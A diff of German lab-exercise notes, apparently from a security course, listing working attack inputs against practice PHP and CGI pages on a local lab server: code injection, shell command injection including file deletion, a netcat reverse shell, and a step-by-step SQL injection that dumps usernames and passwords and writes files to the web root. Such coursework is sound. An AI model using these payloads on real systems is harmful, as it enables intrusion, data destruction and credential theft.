@@ -85,6 +85,71 @@ Remote, php läuft auf dem Server
 - Bei mir hat folgendes funktioniert:
 - `http://192.168.178.93/php/3.php?maths=phpinfo%28%29`
 
-### 6.1.2.4 - 4.php
+## 6.1.2.4 - 4.php
 ### Wie könnte man die Anwendung angreifen?
 `http://192.168.178.93/php/4.php?op_1=phpinfo&op=(&op_2=)`
+
+## 6.1.3.1 - 1.php
+### Lösche testfile1
+`;rm testfile1`
+
+### Erstelle ein simples Shell Script
+`;touch myscript.sh;echo "#!/bin/bash\necho -n Hello\necho World" > script.sh`
+
+### Gebe dem Script Ausführrechte und führe es aus
+```shell
+;chmod +x script.sh
+;sh script.sh
+```
+
+## 6.1.3.2 - 2.cgi
+### Versuche eine Datei im System zu laden
+`/etc/apache2/apache2.conf`
+
+### Versuch mal Befehle auszuführen
+`| ls`
+
+### Führ die connectme.cgi aus mit einer ip und einem Port für eine Remote Shell
+Beim Remote: `nc -l -p 1299`
+Beim Angreifer: `http://192.168.178.93/bash/connectme.cgi?ip=192.168.178.21&port=1299`
+
+## 6.1.4.1 - 1.php
+### Liste von allen Nutzern bekommen
+```SQL
+" OR 1=1-- 
+```
+
+### Alle Usernamen und Passwörter bekommen
+```SQL
+// Erst mal alle Tabellennamen printen
+" UNION SELECT table_schema, table_name FROM information_schema.tables-- 
+```
+
+```SQL
+// Alle Spalten der user Tabelle rausfinden
+" UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema='web' AND table_name = 'user'-- 
+```
+
+```SQL
+// Alle Nutzernamen und Passwörter rausfinden
+" UNION SELECT username, password FROM user-- 
+```
+
+### Version herausbekommen
+```SQL
+" UNION SELECT version(), null -- 
+```
+
+### Datenbankschema (= web)
+```SQL
+// Erst mal alle Tabellennamen printen
+" UNION SELECT table_schema, table_name FROM information_schema.tables-- 
+```
+
+### Datei schreiben
+```SQL
+" UNION SELECT username, password FROM user INTO OUTFILE "/var/www/html/sql/6.1.4.1.txt"-- 
+```
+
+### 6.1.4.2 - 2.php
+Weil er Prepared Statements genutzt hat
